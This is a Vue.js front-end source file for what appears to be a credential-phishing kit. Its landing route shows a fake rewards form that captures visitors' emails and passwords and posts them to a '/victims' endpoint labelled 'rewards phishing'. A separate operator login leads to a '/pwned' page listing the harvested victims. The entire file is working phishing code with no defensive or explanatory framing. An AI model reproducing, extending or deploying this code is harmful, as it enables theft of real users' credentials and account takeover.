/* global Vue, VueRouter, axios */

var RewardsPage = {
  template: "#rewards-page",
  data: function() {
    return {
      email: "",
      password: "",
      method: "rewards phishing",
      errors: []
    };
  },
  created: function() {},
  methods: {
    submit: function() {
      let params = {
        email: this.email,
        password: this.password,
        method: this.method
      };
      axios
        .post("/victims", params)
        .then(function(response) {
          router.push("/")
        })
        .catch(function(error) {
          this.errors = error.response.data.errors;
        }.bind(this));
    }
  },
  computed: {}
};

var LoginPage = {
  template: "#login-page",
  data: function() {
    return {
      email: "",
      password: "",
      errors: []
    };
  },
  created: function() {},
  methods: {
    submit: function() {
      var params = {
        auth: { email: this.email, password: this.password }
      };
      axios
        .post("/user_token", params)
        .then(function(response) {
          axios.defaults.headers.common["Authorization"] = "Bearer " + response.data.jwt;
          localStorage.setItem("jwt", response.data.jwt);
          router.push("/pwned");
        })
        .catch(function(error) {
          this.errors = ["Invalid email or password."];
          this.email = "";
          this.password = "";
        }.bind(this));
    }
  },
  computed: {}
};

var ShowPage = {
  template: "#show-page",
  data: function() {
    return {
      message: "Welcome to Show!",
      victims: []
    };
  },
  created: function() {},
  mounted: function() {
    axios
      .get("/victims")
      .then(function(response) {
        this.victims = response.data;
        console.log(this.victims)
      }.bind(this));
  },
  methods: {},
  computed: {}
};

var router = new VueRouter({
  routes: [
    { path: "/", component: RewardsPage },
    { path: "/login", component: LoginPage },
    { path: "/pwned", component: ShowPage }
  ],
  scrollBehavior: function(to, from, savedPosition) {
    return { x: 0, y: 0 };
  }
});

var app = new Vue({
  el: "#vue-app",
  router: router
});